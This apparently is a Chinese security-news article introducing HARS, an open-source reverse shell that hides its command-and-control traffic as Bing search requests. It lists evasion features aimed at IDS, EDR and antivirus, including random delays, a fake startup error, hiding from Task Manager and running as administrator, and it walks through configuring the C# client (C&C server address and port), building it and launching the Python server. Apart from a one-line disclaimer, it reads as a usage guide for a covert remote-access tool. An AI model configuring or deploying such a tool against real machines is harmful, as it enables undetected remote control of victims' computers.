![](https://image.3001.net/images/20200309/1583764308_5e6653540dfb2.jpg!small)

**目前，我们有很多种方法可以创建一个反向Shell，并尝试绕过防火墙以成功控制远程设备。但实际上，传出的连接并不一定都会被过滤。**

然而随着技术的发展，安全软件和硬件（入侵防御系统IPS、入侵检测系统IDS、代理、反病毒产品和EDR等）也变得越来越强壮，它们有能力去检测到这些攻击行为。而大多数情况下，与反向Shell的连接都是通过TCP或UDP隧道建立的。

因此，我们需要隐藏这些通信信道，而最好的方法就是将它们伪装成合法连接。标准用户使用最多的就是HTTP协议了，而且这种类型的流量几乎不会被过滤掉，以避免影响用户的网站浏览和访问。

![](https://image.3001.net/images/20200309/1583764317_5e66535d0d61c.png!small)

##  工作机制

> 1、客户端App首先需要在目标设备上执行；
>
> 2、客户端与服务器建立初始连接；
>
> 3、服务器接受连接建立请求；

###  接下来：

> 客户端接收到指令之后，会向服务器发送查询请求；
>
> 攻击者提供指令给服务器端；
>
> 当命令被定义后，客户端将会执行该命令，并返回执行结果；
>
> 然后不断执行上述流程，直到攻击者结束会话连接为止。

![](https://image.3001.net/images/20200309/1583764338_5e665372811fe.png!small)

##  功能介绍

该工具的当前版本实现了以下几种功能：

> 1、将HTTP流量伪造成bing.com的搜索流量；
>
> 2、命令会以Base64编码在HTML响应中；
>
> 3、命令执行结果会以Base64编码在客户端cookie中；
>
> 4、[可选]SSL支持，默认使用伪造的bing.com证书；
>
> 5、在每一个客户端调用请求之间设置随机延迟，以避免触发IDS；
>
> 6、服务器的每一个响应都使用了随机模板；
>
> 7、复用相同的PowerShell进程以避免触发EDR；
>
> 8、支持所有的CMD以及PowerShell命令；
>
> 9、[可选]客户端可以在启动时显示伪造的错误信息；
>
> 10、客户端在任务管理器中不可见；
>
> 11、[可选]客户端能以管理员身份运行；

##  反病毒产品检测

我们使用了69款反病毒产品来对我们的客户端来进行检测，其中只有三个会将其检测为恶意程序，而且还是在没有使用任何AV规避或混淆技术的情况下。

![](https://image.3001.net/images/20200309/1583764360_5e6653887f280.png!small)

##  工具配置

###  客户端：C Sharp

1、在Visual Studio中打开HARS.sln文件。

**Config.cs**

这个文件中包含了工具的运行参数，我们需要根据具体情况来配置每个参数的值：

    
    
    class Config
    
            {
    
                /* Behavior */
    
                // Display a fake error msg at startup
    
                public static bool DisplayErrorMsg = true;
    
                // Title of fake error msg
    
                public static string ErrorMsgTitle = "This application could not be started.";
    
                // Description of fake error msg
    
                public static string ErrorMsgDesc = "Unhandled exception has occured in your application. \r\r Object {0} is not valid.";
    
                // Min delay between the client calls
    
                public static int MinDelay = 2;
    
                // Max delay between the client calls
    
                public static int MaxDelay = 5;
    
                // Fake uri requested - Warning : it must begin with "search" (or need a change on server side)
    
                public static string Url = "search?q=search+something&qs=n&form=QBRE&cvid=";
    
                /* Listener */
    
                // Hostname/IP of C&C server
    
                public static string Server = "[https://127.0.0.1](https://127.0.0.1/)";
    
                // Listening port of C&C server
    
                public static string Port = "443";
    
                // Allow self-signed or "unsecure" certificates - Warning : often needed in corporate environment using proxy
    
                public static bool AllowInsecureCertificate = true;
    
        }

**HARS.manifest**

按照下列命令修改相应参数，工具将默认以特殊权限运行：

    
    
    <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
    
        <requestedExecutionLevel level="asInvoker" uiAccess="false" />
    
        <requestedExecutionLevel level="highestAvailable" uiAccess="false" />

**项目属性**

在下面这个界面中，你可以自定义配置编译信息以及文件图标：

![](https://image.3001.net/images/20200309/1583764400_5e6653b0913b9.png!small)

注意：目标.NET框架版本设置为了v4.6，Windows 10默认自带了这个版本的框架。如果是Windows 7，你可以选择.NET v3.5。

**代码构建**

你需要在Visual Studio中构建项目源码，生成的客户端程序将存储在Http Asynchronous Reverse
Shell\HARS_Client\HARS\bin\Release目录下。

###  服务器端：Python

HARS_Server.py文件位于Http Asynchronous Reverse
Shell\HARS_Server\www目录下。如果你需要修改端口或证书位置，可以直接修改配置文件中的相应参数：

    
    
    # Config
    
        PORT = 443
    
        CERT_FILE = '../server.pem'

##  工具运行

    
    
    python HARS_Server.py

###  其他配置

> 1、HTTP日志文件存储在Http Asynchronous Reverse Shell\HARS_Server\logs目录下。
>
> 2、你可以在Http Asynchronous Reverse
> Shell\HARS_Server\templates目录下添加你自己的模板（任意HTML页面文件）。

##  工具演示

###  客户端

![](https://image.3001.net/images/20200309/1583764482_5e6654027d698.gif!small)

###  服务器端

![](https://image.3001.net/images/20200309/1583764495_5e66540f84696.gif!small)

##  声明

此工具仅用作授权安全测试的概念验证演示工具，请不要将其用于恶意目的。

##  项目地址

> Http-Asynchronous-Reverse-Shell：【[GitHub传送门](https://github.com/onSec-> fr/Http-Asynchronous-Reverse-Shell)】

 *** 参考来源：[onSec-fr](https://github.com/onSec-fr/Http-Asynchronous-Reverse-Shell)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

